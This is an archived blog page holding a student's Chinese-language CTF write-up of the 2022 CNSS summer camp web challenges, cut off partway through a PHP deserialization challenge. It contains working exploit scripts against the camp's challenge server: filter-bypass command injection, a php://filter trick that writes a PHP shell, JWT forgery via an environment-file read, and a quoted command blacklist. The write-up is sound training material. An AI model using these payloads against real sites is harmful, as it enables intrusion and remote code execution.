@@ -1,0 +1,1352 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="我是真的喜欢凝聚啊, 大家一起就像情侣一样">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Timlzh">
+    
+
+    <!-- Title -->
+    
+    <title>2022 CNSS夏令营 Web&amp;Reverse 复现wp | CTF Writeup | Tim的杂货铺</title>
+
+    <!-- favicon -->
+    
+        <link rel="shortcut icon" href="https://timlzh.github.io/melody-favicon.ico">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Valine -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+    <link rel="stylesheet" href="/server-archive/css/darkmode.css">
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/server-archive/css/style.css">
+
+
+    <!-- Top Menu  -->
+    <div class="top_menu">
+        
+            
+            <a href="/server-archive/">Home</a>
+            
+            <a href="/server-archive/links">Friends</a>
+            
+            <a href="/server-archive/tags">Tags</a>
+            
+            <a href="/server-archive/about">About</a>
+            
+            <a href="/server-archive/">asdfa</a>
+            
+        
+        <a class="darkmode-toggle" href="#" data-toggle="darkmode">
+            <i class="fa fa-moon-o"></i>
+            <i class="fa fa-sun-o" style="display: none;"></i>
+        </a>
+    </div>
+
+    <!-- Darkmode -->
+    <script src='/server-archive/js/darkmode.js'></script>
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.jsdelivr.net/npm/font-awesome@4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- jQuery -->
+    <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+    <!-- Bootstrap -->
+    <script src="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/js/bootstrap.min.js"></script>
+
+    <!-- Highlight -->
+    
+        <script>
+            var lightTheme = "github";
+            var darkTheme = "github-dark-dimmed";
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/server-archive/atom.xml" title="Tim的杂货铺" type="application/atom+xml">
+</head>
+
+
+<body>
+
+    <!-- Content -->
+    
+
+
+<section class="article-container">
+    <!-- Back Home -->
+    <!-- <a class="nav-back" href="javascript:back()">
+    <i class="fa fa-arrow-left"></i>
+</a>
+
+<script>
+    function back() {
+        var home = '/server-archive/'
+        if (document.referrer && document.referrer.indexOf(home) > -1) {
+            window.history.back();
+        } else {
+            window.location.href = home;
+        }
+    }
+</script> -->
+
+        <!-- Page Header -->
+        <header class="intro-header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <div class="post-heading">
+                            <h1>
+                                2022 CNSS夏令营 Web&Reverse 复现wp
+                            </h1>
+                            <div class="subheading">
+                                CTF Writeup
+                            </div>
+                            <hr>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <article>
+            <div class="container">
+                <div class="row">
+                    <!-- Post Main Content -->
+                    <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <blockquote>
+<p>我是真的喜欢凝聚啊, 大家一起就像情侣一样</p>
+</blockquote>
+<span id="more"></span>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12opley-2.png" alt="image"></p>
+<h1 id="%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2" tabindex="-1">写在前面</h1>
+<hr>
+<p>很有趣的一次~~(大)学前教育~~, 作为一个22级泥电新生, 以前没接触过ctf, 进新生群然后就被拉进来Van了. 结果没想到还挺好玩~~(可能是我这几天太无聊了)~~, 边学边打居然还能当榜一, 满足了.</p>
+<p>还是很开心的, 高二有想过打CTF, 但是后面搁置了就忘了, 这也算是圆梦了. 一下能入门接触到这些Web/Re/PWN/Crypto, 接触了IDA/Burp Suite/PWNTools等等, 很有成就感, 也很有满足感. <strong>至少暑假不是在颓废了</strong>. 嘿嘿~</p>
+<p>BTW, CNSS的佬们还是很好很热情的, 氛围很好, 开森(/≧▽≦)/.</p>
+<h1 id="web" tabindex="-1">WEB</h1>
+<h2 id="%F0%9F%9A%A9-signin-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">🚩 Signin | 难度评分: ★</h2>
+<blockquote>
+<p>新手友好签到题!</p>
+</blockquote>
+<p>直接打开链接, 显示<code>Please Change Your Method!</code>. 改成Post后访问出现PHP代码:</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+require_once(&quot;flag.php&quot;);
+if($_SERVER['REQUEST_METHOD'] !=='POST')&#123;
+    die(&quot;Please Change Your Method!&quot;);
+    exit();
+&#125;else&#123;
+    if(!isset($_POST[&quot;CNSS&quot;]))&#123;
+        show_source(__FILE__);
+    &#125;
+    else if($_POST[&quot;CNSS&quot;] === &quot;join&quot;)&#123;
+        if((isset($_GET[&quot;web&quot;])) &amp;&amp; (($_GET[&quot;web&quot;]) === &quot;like&quot;))&#123;
+            setcookie(&quot;flag&quot;,&quot;0&quot;);
+            if($_COOKIE['flag'] === '1')&#123;
+                echo $flag;
+            &#125;else&#123;show_source(__FILE__);&#125;
+        &#125;else&#123;
+            show_source(__FILE__);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>很明显, 需要在POST的data里加入<code>CNSS: join</code>, 在GET的args里写上<code>?web=like</code>, 并且设置cookie中<code>flag=1</code>, 就会打印flag啦~</p>
+<p>Python代码</p>
+<pre><code class="language-python">import requests
+
+url = 'http://8.130.29.197:6001?web=like'
+data = &#123;'CNSS': 'join'&#125;
+cookies = &#123;'flag': '1'&#125;
+x = requests.post(url, data=data, cookies=cookies)
+print(x.text)
+</code></pre>
+<p>或Burp Suite:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12opsdm-2.png" alt="Burp Suite"></p>
+<p>结果:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oppq5-2.png" alt="FLAG"></p>
+<p><code>CNSS&#123;Y0u_kn0w_GET_and_POST&#125;</code></p>
+<hr>
+<h2 id="%E2%9A%99%EF%B8%8F-d3buger-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">⚙️ D3buger | 难度评分: ★</h2>
+<blockquote>
+<p>题目目的就是让我们不要仅限于F12罢(</p>
+</blockquote>
+<p>其实用Burp Suite直接就打开了, 这里不讲了. 如果用网页的话, 我建议是先打开一个网页, <a target="_blank" rel="noopener" href="http://xn--baidu-gv5ij80i.com">比如baidu.com</a>, 然后F12打开开发者工具, 再在地址框输入访问目标地址, 这样好像是无解的, 无法检测.</p>
+<p>答案就在<code>fuck.js</code>里~~(什么奇葩名字~~</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12opv7k-2.png" alt="image"></p>
+<p><s>(捏吗, xlykle这种佬又在演!</s></p>
+<p><code>CNSS&#123;Wh@t_A_Sham3le55_thI3f&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%94%A2-%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">🔢 更简单的计算题 | 难度评分: ★</h2>
+<blockquote>
+<p>奇奇怪怪的题目</p>
+</blockquote>
+<p>打开, 计算出结果后输入发现只能输入5位, 提交也不能点.</p>
+<p>直接F12, 把<code>max-length</code>改成<code>-1</code>, 把<code>disable</code>去掉就行.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12opwji-2.png" alt="image"></p>
+<p><code>CNSS&#123;ohhh__m@th_1s_s0_ez!!!&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%94%A2-%E6%9B%B4%E5%9D%91%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85" tabindex="-1">🔢 更坑的计算题 | 难度评分: ★★</h2>
+<blockquote>
+<p>开始上难度, 要用到脚本辽</p>
+</blockquote>
+<p>打开发现限时, F12能看出来那个<code>+1s</code>纯纯的摆设~~(真暴力啊~~. 一秒钟的限时. Python直接算出来提交就行了, 记得把Cookie带上哦!</p>
+<pre><code class="language-python">import requests
+import re
+
+url = 'http://8.130.29.197:6003/'
+
+get = requests.get(url)
+cookies = get.cookies
+
+# 正则匹配出乘法式子, a*b, 再通过split分割成两个数, 转为int乘出结果
+# 格式: &lt;p&gt;22159793*39616436=&lt;/p&gt;&lt;form method=&quot;post&quot;&gt;
+equation = re.findall(r'&lt;p&gt;(.*?)=&lt;/p&gt;&lt;form method=&quot;post&quot;&gt;', get.text)[-1]
+a, b = equation.split('*')
+ans = int(a)*int(b)
+
+post = requests.post(url, data=&#123;'res': ans&#125;, cookies=cookies)
+
+print(post.text)
+</code></pre>
+<p>结果</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oq4mx-2.png" alt="image"></p>
+<p><code>CNSS&#123;w#y_5o_f4st?&#125;</code></p>
+<h2 id="%F0%9F%87%A8%F0%9F%87%B3-china-flag-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">🇨🇳 China Flag | 难度评分: ★★★</h2>
+<blockquote>
+<p>这道题把我卡死了(, 脑洞太大, 有种Misc的感觉. 而且用Python访问不能正常出结果</p>
+</blockquote>
+<h3 id="referer" tabindex="-1">Referer</h3>
+<p>强制跳转啥的就不管了, 直接进到<code>http://8.130.29.197:6004/china.php</code>里, 问<code>?我的朋友，你从哪儿找来的</code>, 结合hint说的http报头, 那&quot;从哪来&quot;大概率指的<code>Referer</code>.</p>
+<h3 id="x-forwarded-for" tabindex="-1">X-Forwarded-For</h3>
+<p>尝试几个可能的Referer后发现, Referer为<code>http://8.130.29.197:6004/index.php</code>时, 提示信息变成了<code>你真的是土生土长的拆尼斯🐴？</code>. 联想到梯子, 可能指的是代理, 报头里<code>X-Forwarded-For</code>可以体现. 而<code>土生土长</code>指的是本地ip<code>127.0.0.1</code>.</p>
+<p>所以设置<code>X-Forwarded-For</code>为<code>127.0.0.1</code>, Burp Suite就能出正确结果了.</p>
+<h3 id="accept-language" tabindex="-1">Accept-Language</h3>
+<p>但是如果使用<code>Python</code>会莫名多个考点, 就是要把<code>Accept-Language</code>设置成<code>zh-CN</code>, (Burp Suite默认就是),并且这一步没有任何提示(据说本来有, 可能出问题了). 所以把我卡死了, 因为做这道题的时候我还不会Burp Suite, 用Python写的脚本…乌鱼子~</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oq5bp-2.png" alt="image"></p>
+<p><code>CNSS&#123;ohHHHHH~~~Ch1ne5e_Kungfu!&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%A4%A5-trick-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">🤥 Trick | 难度评分: ★★★★</h2>
+<blockquote>
+<p>确实是一道搜索引擎应用题, PHP漏洞多, 不可能全部记住, 找到重点可疑句子拿去搜索, 大概率有结果</p>
+</blockquote>
+<p>访问得到php代码</p>
+<pre><code class="language-php">&lt;?php
+    error_reporting(0);
+    require_once(&quot;flag.php&quot;);
+    show_source(__FILE__);
+
+    $pass = '0e0';
+    $md55 = $_COOKIE['token'];
+    $md55 = md5($md55);
+
+    if(md5($md55) == $pass)&#123;
+        if(isset($_GET['query']))&#123;
+            $before = $_GET['query'];
+            $med = 'filter';
+            $after = preg_replace(
+                &quot;/$med/&quot;, '', $before
+            );
+            if($after === $med)&#123;
+                echo $flag1;
+            &#125;
+        &#125;
+        $verify = $_GET['verify'];
+    &#125;
+
+    extract($_POST);
+    
+    if(md5($verify) === $pass)&#123;
+        echo $$verify;
+    &#125;
+?&gt;
+</code></pre>
+<h3 id="%5B%E6%BC%8F%E6%B4%9E-0x00%5D-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E-(%3D%3D)" tabindex="-1">[漏洞 0x00] 弱类型比较漏洞 (==)</h3>
+<p>php有两种类型比较的符号, 弱类型比较<code>==</code>和强类型比较<code>===</code>. 在弱类型比较时会转换变量类型, 这样有些不相等的东西也会变相等了.</p>
+<p>这里就是利用了弱类型比较时, <code>0e</code>开头且后面都是数字的字符串会被转换成科学计数法的数字, 也就是0的n次方, 都等于零. 所以’0exxxxx’都是弱比较相等的.</p>
+<p>所以我们只需要找到md5加密两次之后, 开头还是<code>0e</code>的字符串. <s>写个Python脚本爆破一个出来</s>Google一下能找到已经爆破好的字符串, 如<code>f2WfQ</code>和<code>iv2Cn</code>.</p>
+<p>把偷来的爆破脚本也Po出来(来源<a target="_blank" rel="noopener" href="https://0clickjacking0.github.io/2020/08/24/CTF%E4%B8%AD%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">xianyu123’s Blog</a>)</p>
+<pre><code class="language-python">import string
+import hashlib
+
+payload = string.ascii_letters + string.digits
+
+
+def calc_md5(s):
+    md5 = hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest()
+    md5_double = hashlib.md5(md5.encode(&quot;utf-8&quot;)).hexdigest()
+    if (md5_double[0:2] == &quot;0e&quot; and md5_double[2:].isdigit()):
+        print(s)
+
+
+def getstr(payload, s, slen):
+    if (len(s) == slen):
+        calc_md5(s)
+        return s
+
+    for i in payload:
+        sl = s + i
+        getstr(payload, sl, slen)
+
+
+# 字符串长度从0到30，肯定找得到
+for i in range(3, 30):
+    getstr(payload, '', i)
+</code></pre>
+<p>所以我们把cookie设置成<code>token=f2WfQ</code>就能直接绕过第一个md5验证.</p>
+<h3 id="%5B%E6%BC%8F%E6%B4%9E-0x01%5D-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E" tabindex="-1">[漏洞 0x01] 正则匹配漏洞</h3>
+<p>如代码所示, 会把<code>filter</code>从字符串里去掉, 并且要求去掉后的字符串还是<code>filter</code>.</p>
+<p>那么其实动动歪脑筋, 把这个单词拆开放在这个单词两边就行了, 如<code>fifilterlter</code>, 代码会把中间的filter字样去掉, 去掉了还是fliter这个单词.</p>
+<p>所以把<code>query</code>设置成<code>fifilterlter</code>就好了.</p>
+<p>这个时候运行就可以得到前半个flag了, 也就是flag1.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oqepw-2.png" alt="image"></p>
+<blockquote>
+<p>为什么只有一半的变量捏, 那有flag1肯定有flag2是吧, 我们怎么输出flag2捏?</p>
+</blockquote>
+<h3 id="%5B%E6%BC%8F%E6%B4%9E-0x02%5D-extract%E6%BC%8F%E6%B4%9E" tabindex="-1">[漏洞 0x02] extract漏洞</h3>
+<p>extrat会把字典里的内容提取出来变成变量, 这个过程会覆盖掉原有的同名变量这样就可以替换掉.</p>
+<p>所以我们post个<code>verify</code>和<code>pass</code>上去, 让<code>md5(verify)</code>和<code>pass</code>相等就行.</p>
+<h3 id="%5B%E6%BC%8F%E6%B4%9E-0x03%5D-%E5%8F%8C%24%24%E8%BD%AC%E4%B9%89%E6%BC%8F%E6%B4%9E" tabindex="-1">[漏洞 0x03] 双$$转义漏洞</h3>
+<blockquote>
+<p>绕过了那个if了, 怎么打印flag2呢?</p>
+</blockquote>
+<p>仔细看, 最后一个echo的是<code>$$verify</code>, 有两个$. 这样会将verify的内容当成变量名再取一次变量.</p>
+<p>比如, 如果<code>$verify = &quot;flag2&quot;</code>, 那<code>$$verify</code>就是<code>$flag2</code>.</p>
+<p>那么我们就只需要将verify设置成<code>flag2</code>即可打印出flag2</p>
+<p>此时pass就是<code>&quot;flag2&quot;</code>这个字符串的md5值</p>
+<h3 id="%E4%BB%A3%E7%A0%81%E5%8F%8A%E7%BB%93%E6%9E%9C" tabindex="-1">代码及结果</h3>
+<p>完整Python源码:</p>
+<pre><code class="language-Python">import requests
+
+url = 'http://8.130.29.197:6005?query=ffilterilter'
+cookie = &#123;&quot;token&quot;: &quot;f2WfQ&quot;&#125;
+# md5(&quot;flag2&quot;) = 9a48ddad2656385fce58af47a0ef56cf
+data = &#123;&quot;pass&quot;: &quot;9a48ddad2656385fce58af47a0ef56cf&quot;, &quot;verify&quot;: &quot;flag2&quot;&#125;
+x = requests.post(url, cookies=cookie, data=data)
+
+print(x.text)
+</code></pre>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oqcy0-2.png" alt="image"></p>
+<p><code>CNSS&#123;B4by_9h9_Tr1ck&#125;</code></p>
+<hr>
+<h2 id="%E2%AC%9B-blackpage-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">⬛ BlackPage | 难度评分: ★★★★</h2>
+<h3 id="php%3A%2F%2Ffilter" tabindex="-1">php://filter</h3>
+<p>打开网页, 在网页源码的注释里找到线索:</p>
+<pre><code class="language-php">&lt;?phps
+$file = $_GET[&quot;file&quot;];
+$blacklist = &quot;(**blacklist**)&quot;;
+if (preg_match(&quot;/&quot;.$blacklist.&quot;/is&quot;,$file) == 1)&#123;
+  exit(&quot;Nooo,You can't read it.&quot;);
+&#125;else&#123;
+  include $file;
+&#125;
+//你能读到 mybackdoor.php 吗？
+</code></pre>
+<p>考点是<code>php://filter</code>和包含的应用, 这里Po一篇详细的解释: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684259.html">探索php://filter在实战当中的奇技淫巧</a></p>
+<p>这里我们直接用<code>php://filter/read=convert.base64-encode/resource=</code>就能读取mybackdoor.php文件. 访问<code>http://8.130.29.197:6006/?file=php://filter/read=convert.base64-encode/resource=mybackdoor.php</code>即可.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oqty5-2.png" alt="image"></p>
+<p><s>(这个输出在黑色图片上, 一晃眼真会忽略掉)</s></p>
+<h3 id="tab%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%2Furl%E7%BC%96%E7%A0%81" tabindex="-1">Tab代替空格/URL编码</h3>
+<p>拿去base64解密后就能看到<code>mybackdoor.php</code>:</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+function blacklist($cmd)&#123;
+  $filter = &quot;(\\&lt;|\\&gt;|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\&#123;IFS\\&#125;|index|\\*)&quot;;
+  if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$cmd)==1)&#123;  
+      exit('Go out! This black page does not belong to you!');
+  &#125;
+  else&#123;
+    system($cmd);
+  &#125;
+&#125;
+blacklist($_GET['cmd']);
+?&gt;
+</code></pre>
+<p>这里禁用了很多命令, 甚至包括空格, 但是我们可以用tab来替代空格, tab在url编码里是<code>%09</code>, 所以<code>ls /</code>就可以写成<code>ls%09/</code>.</p>
+<p>访问<code>http://8.130.29.197:6006/mybackdoor.php?cmd=ls%09</code>得到目录下文件, flag文件名为<code>Fl4g_is_here</code></p>
+<h3 id="%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D" tabindex="-1">绕过正则匹配</h3>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oqvhy-2.png" alt="image"></p>
+<p>现在我们需要输出这个文件, 有几个不同的方法</p>
+<h4 id="%5B%E6%96%B9%E6%B3%95-0x00%5D-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87preg_match" tabindex="-1">[方法 0x00] 单引号绕过preg_match</h4>
+<p>这里涉及到单引号可以绕过preg_match的考点, cat不能用, 写成<code>c'a't</code>就行了.</p>
+<p>于是输出命令就变成了<code>c'a't%09F'l'4'g_is_here</code></p>
+<h4 id="%5B%E6%96%B9%E6%B3%95-0x01%5D-%E4%BD%BF%E7%94%A8nl%E5%91%BD%E4%BB%A4" tabindex="-1">[方法 0x01] 使用nl命令</h4>
+<p>nl是输出带行号的文件内容的命令, 且可以模糊匹配文件名, 这里没有被禁掉, 我们就可以直接<code>nl%09/F[a-z]4g_is_here</code>运行</p>
+<h4 id="%5B%E6%96%B9%E6%B3%95-0x02%5D-%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81%E8%AF%BB%E5%8F%96" tabindex="-1">[方法 0x02] 使用base64编码读取</h4>
+<p>linux的echo可以解码base64, 可以利用这个特性绕过正则, 输出工具用tac, nl这些都行, 反引号意思是将echo的结果输出给前面的命令, <code>/Fl4g_is_here</code>的加密结果为<code>L0ZsNGdfaXNfaGVyZQ</code>所以可以直接使用</p>
+<pre><code>nl%09`echo%09L0ZsNGdfaXNfaGVyZQ|base64%09-d`
+或
+tac%09`echo%09L0ZsNGdfaXNfaGVyZQ|base64%09-d`
+</code></pre>
+<p>输出flag</p>
+<h3 id="%E7%BB%93%E6%9E%9C" tabindex="-1">结果</h3>
+<p>上面的命令任选其一, 作为参数访问<code>http://8.130.29.197:6006/mybackdoor.php?cmd=</code>即可.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oqs9w-2.png" alt="image"></p>
+<p><code>CNSS&#123;0ops!Y0u_G0t_My_Bl4ckp4ge!&#125;</code></p>
+<hr>
+<h2 id="%E2%98%AF%EF%B8%8F-%E5%A4%AA%E6%9E%81%E6%8E%8C%E9%97%A8%E4%BA%BA-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">☯️ 太极掌门人 | 难度评分: ★★★</h2>
+<p>打开页面获得php代码</p>
+<pre><code class="language-php">&lt;?php
+    error_reporting(0);
+    show_source(__FILE__);
+
+    function deleteDir($path) &#123;
+
+        if (is_dir($path)) &#123;
+            $dirs = scandir($path);
+            foreach ($dirs as $dir) &#123;
+                if ($dir != '.' &amp;&amp; $dir != '..') &#123;
+                    $sonDir = $path.'/server-archive/'.$dir;
+                    if (is_dir($sonDir)) &#123;
+
+                        deleteDir($sonDir);
+
+                        @rmdir($sonDir);
+
+                    &#125; elseif ($sonDir !== './index.php'
+                            &amp;&amp; $sonDir !== './flag.php') &#123;
+
+                        @unlink($sonDir);
+
+                    &#125;
+                &#125;
+            &#125;
+            @rmdir($path);
+        &#125;
+    &#125;
+
+    $devil = '&lt;?php exit;?&gt;';
+
+    $goods = $_POST['goods'];
+
+    file_put_contents($_POST['train'], $devil . $goods);
+
+    sleep(1);
+
+    deleteDir('.');
+
+?&gt;
+</code></pre>
+<p>函数里一大段不用管, 用来删除你扔进去的文件的,主要是看后面这几行</p>
+<pre><code class="language-php">$devil = '&lt;?php exit;?&gt;';
+$goods = $_POST['goods'];
+file_put_contents($_POST['train'], $devil . $goods);
+sleep(1);
+deleteDir('.');
+</code></pre>
+<p>很明显, 你可以通过<code>file_put_contents</code>写点文件到某个php文件里, 然后你有一秒的时间访问它.</p>
+<p>但是写入它之前明显你需要先去掉或者绕过<code>&lt;?php exit;?&gt;</code>才能使你写入的代码正常执行.</p>
+<p>所以这里就涉及到<code>file_put_contents</code>的漏洞问题了, 由于此函数的特性, 文件名处(也就是这段代码里的train), 可以使用<code>php://filter</code>语句, 我们就可以通过filter加解密的方式将<?php exit;?>破坏掉</p>
+<p><code>php://filter/write=convert.base64-decode/resource=shell.php</code> 可以将内容解密后再写入, 我们传入我们想要的代码的base64密文, 拼接在前面的<code>&lt;?php exit;?&gt;</code>会被解码成乱码, 而我们的代码可以正常解密.</p>
+<p>需要注意的是, 由于符号不会被解密, <code>&lt;?php exit;?&gt;</code>被解密的就只有phpexit这七个字符. base64密文是4个为一组, 所以我们需要再多添一位.</p>
+<p>比如, 我想执行<code>&lt;?php system('cat flag.php');?&gt;</code>, 这段话加密后为<code>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code>, 我们在前面添加一位变成<code>aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code>. 这样传进去解码后的结果就是<code>�^�+Z&lt;?php system('cat flag.php');?&gt;</code>, 执行后直接就输出了.</p>
+<p>Python代码:</p>
+<pre><code class="language-python">import requests
+from threading import Thread
+from time import sleep
+
+url = &quot;http://8.130.29.197:6002/&quot;
+url2 = &quot;http://8.130.29.197:6002/shell.php&quot;
+data = &#123;
+    'goods': 'aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==',
+    'train': 'php://filter/write=convert.base64-decode/resource=shell.php',
+&#125;
+
+t = Thread(target=requests.post, args=(url, data))
+t.start()
+sleep(0.5)
+x = requests.get(url2)
+print(x.text)
+</code></pre>
+<p>因为只有1s, 所以我用多线程同时访问两个页面, 不会超时.</p>
+<p>结果:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12or3jp-2.png" alt="image"></p>
+<p><code>CNSS&#123;F45ter_7han_Re5per&#125;</code></p>
+<blockquote>
+<p>我刚刚复现这道题的时候试了试另外一个方法, 就是服务器不让直接访问flag.php, 那我就把flag.php改名成flag1.php然后访问, 这个是可以实现的, 但是!!!我没改回来, 所以flag1.php就被自动删除掉了, 导致flag没了!没了!没了!, 幸好flag有记录, 这玩意可以执行任何系统代码, 我就写回去了.</p>
+</blockquote>
+<hr>
+<h2 id="%F0%9F%A5%B3-to_be_admin-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85" tabindex="-1">🥳 To_be_Admin | 难度评分: ★★</h2>
+<p>直接访问, 从主页跳转到<code>/admin</code>, 提示需要admin. 抓包发现token, ~~(虽然不知道是什么token但是直接复制粘贴到必应搜索)~~发现是JWT.</p>
+<p>使用<a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a>解密发现Payload里带username, 改为admin即可.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12or2or-2.png" alt="image"></p>
+<p>但是稍加了解jwt就知道你还需要一个给定的<code>key</code>来加密验证段, 这个key在哪里找呢?</p>
+<p>主页给了一个hint是<code>/read</code>页面, 打开提示<code>GET file</code>, 那么我们就加上file参数读文件. 先试了<code>/read?file=flag.php</code>, 返回<code>Hacker</code>. 说明对特殊字符串进行了正则屏蔽.</p>
+<p>遂搜索, 找到一篇介绍CTF中linux常见文件读取路径的文章.</p>
+<p>文章链接:<a target="_blank" rel="noopener" href="https://blog.csdn.net/aa2528877987/article/details/118574158">任意文件读取漏洞-文件读取漏洞常见读取路径(liunx)</a></p>
+<p>一个一个试. 到<code>/read?file=/proc/self/environ</code>的时候找到了Key.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12orais-2.png" alt="image"></p>
+<p><code>THIS_is_a_KEY</code></p>
+<p>填入jwt, 获得重新加密的token<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.rcaAsLy8BWRTgbRy-Npw2eNarwBAZzINqA2LSZKcQhA</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12or6x6-2.png" alt="image"></p>
+<p>修改cookie中的token即可, 最后可能需要到css文件里复制flag.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12orhpe-2.png" alt="image"></p>
+<p><code>CNSS&#123;yeeeeeee_Y0u_are_Adm1n_n0w&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%A4%90-to_be_admin_again-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">🤐 To_be_Admin_Again | 难度评分: ★★★★★</h2>
+<p>打开页面得到php代码:</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php');
+session_start();
+highlight_file(__FILE__);
+class CNSS&#123;
+    private $username = 'guest';
+    private $code = 'phpinfo();';
+    public function __construct()&#123;
+        $this-&gt;username = $username;
+        $this-&gt;code = $cmd;
+    &#125;
+
+    function __wakeup()&#123;
+        $this-&gt;username = 'guest';
+    &#125;
+
+    function __destruct()&#123;
+        if($this-&gt;username === 'admin')&#123;
+            eval($this-&gt;code);
+        &#125;
+    &#125;
+&#125;
+
+// You must be interested in save.php
+</code></pre>
+<p>最后一行提示去看<code>save.php</code>:</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_serialize');
+session_start();
+highlight_file(__FILE__);
